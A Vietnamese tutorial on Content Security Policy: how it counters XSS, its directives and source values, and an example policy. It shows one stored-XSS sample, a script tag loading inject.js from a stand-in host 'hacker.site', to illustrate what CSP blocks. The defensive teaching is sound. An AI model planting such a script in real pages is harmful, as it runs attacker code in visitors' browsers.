# CSP

## 1. Content Security Policy (CSP) là gì

![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2020/11/content-security-policy-csp-header-1024x395.png)

CSP là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng. 

CSP là biện pháp đối phó rất hiệu quả với kiểu hack chèn mã độc Cross Site Scripting (XSS).

Content Security Policy có thể được coi là một phiên bản nâng cao của X-XSS-Protection header ở trên. 

Trong khi X-XSS-Protection sẽ cản toàn bộ các scripts đi kèm với request nhưng nó sẽ không thể cả được những tấn công XSS mà sẽ lưu lại script độc hại trên server của bạn hoặc tải từ một nguồn khác chứa sript độc hại trong đó.

CSP cho bạn ngôn ngữ để chỉ ra những nơi mà trình duyệt được phép tải tài nguyên về. Bạn có thể định nghĩa một danh sách các nguồn scripts, ảnh, font chữ, css cho từng cái một, cũng như kiểm tra hash của các tài nguyên đã được tải đó với chữ kí có sẵn.

Khi truy cập vào một trang web, trình duyệt sẽ gửi yêu cầu tải nội dung đến máy chủ. 

Máy chủ sẽ gửi trả lại nội dung của trang web này cho trình duyệt, trong đó bao gồm các file CSS, Javascript, Font, Frame...

Trình duyệt sẽ tải toàn bộ những file này, vì nó được chỉ định phải làm như vậy từ mã nguồn của trang web để có thể hiển thị nội dung.

Hacker có thể lợi dụng điều này để đặt một đoạn mã ở trong mã nguồn (những người sử dụng mã nguồn không rõ nguồn gốc hoặc hàng nulled rất hay bị dính) hoặc trong một phần bình luận trên trang web để tải một số file Javascript độc hại từ một nguồn bên ngoài.

```javascript
<script src="http://hacker.site/inject.js"></script>
```

Đây là dạng tấn công XSS Stored rất phổ biến mà các website WordPress hay gặp phải. 

Nhờ CSP header, `hacker.site` không nằm trong whitelist nên không cách nào tải và thực thi được, từ đó bảo vệ bạn và người truy cập của bạn.

Trình duyệt sẽ không tự biết được có nên tải những file này hay không, nó chỉ thực thi theo yêu cầu, cho dù nguồn gốc của file Javascript đến đâu.

Để bật CSP thì response header trả về trong request cần phải bao gồm `Content-Security-Policy` 

Một số trình duyệt liên tục thu thập thông tin người sử dụng, hoặc người dùng cài đặt những extension không rõ nguồn gốc dẫn tới việc bị chèn mã độc, quảng cáo trên trang mặc dù chủ website không cố ý. 

Nhờ CSP, người dùng sẽ truy cập website chúng ta với giao diện "sạch" nhất có thể vì trình duyệt đã chặn ngay từ đầu rồi.

## 2. Tạo danh sách content source an toàn

Tạo một danh sách CSP cho phép chỉ định các nguồn nội dung an toàn mà trình duyệt có thể tải. 

Bằng cách này có thể bảo vệ người truy cập và chính bạn khỏi các mã độc hại do hacker inject trang web.

### a. Các chỉ thị của CSP

Không chỉ ngăn chặn tải Javascript, CSP cũng có tác dụng với hình ảnh, CSS, frame, webfont, media và rất nhiều chỉ thị (directive) khác. 

Điều này tạo nên một lớp bảo mật vừa đủ cho các website, giúp người truy cập chỉ tải và sử dụng đúng những thứ bạn mong muốn.

| directive   | Giải thích                                                      |
|-------------|-----------------------------------------------------------------|
| script-src  | Chỉ định những nguồn được tải cho các tài nguyên Javascript     |
| style-src   | Chỉ định những nguồn được tải cho các tài nguyên CSS            |
| connect-src | Chỉ định những nguồn được tải cho các request Ajax, WebSocket   |
| font-src    | Chỉ định những nguồn được tải cho các tài nguyên là webfont     |
| img-src     | Chỉ định những nguồn được tải cho các tài nguyên là hình ảnh    |
| frame-src   | 	Chỉ định những nguồn được tải cho các tài nguyên là `<iframe>` |

### b. Thuộc tính và giá trị của CSP directive

Mỗi chỉ thị có nhiều domain được thêm vào khác nhau, tuy nhiên có một số cách sử dụng nên biết để có thể dùng thoải mái hơn:

| Value CSP directive | Giải thích                                                                                                        |
|---------------------|-------------------------------------------------------------------------------------------------------------------|
| *                   | Giá trị wildcard, tương đương allow all                                                                           |
| ‘self’              | Là chính domain mà người dùng đang truy cập                                                                       |
| ‘none’              | Không cho phép tải từ bất cứ nguồn nào, kể cả domain hiện tại                                                     |
| data:               | Cho phép những tài nguyên sử dụng data: được tải, ví dụ hình ảnh mã hóa base64                                    |
| www.domain.com      | Cho phép tải từ www.domain.com. Tuy nhiên hãy lưu ý, www.domain.com và domain.com được xem là hoàn toàn khác nhau |
| domain.com          | 	Cho phép tải từ domain.com. Tuy nhiên không cho phép tải từ www.domain.com, sub.domain.com, cdn.domain.com,…     |
| *.domain.com        | Cho phép tải từ www.domain.com, sub.domain.com, cdn.domain.com,..                                                 |
| https://domain.com  | Chỉ cho phép tải từ domain.com sử dụng giao thức HTTPS                                                            |
| https:              | Chỉ cho phép tải từ nguồn sử dụng giao thức HTTPS                                                                 |


Ví dụ ta có đoạn CSP sau:

```
script-src 'self' 'unsafe-inline' 'unsafe-eval'
www.googletagmanager.com connect.facebook.net
    www.googleadservices.com www.google-analytics.com
    googleads.g.doubleclick.net onesignal.com
    tpc.googlesyndication.com
```

Vậy thì trình duyệt sẽ cho phép tải Javascript từ các nguồn sau:

* self
* unsafe-inline
* unsafe-eval
* www.googletagmanager.com, connect.facebook.net,...

## 3. Tham khảo 

* https://portswigger.net/web-security/cross-site-scripting/content-security-policy

* Check CSP: https://csp-evaluator.withgoogle.com/

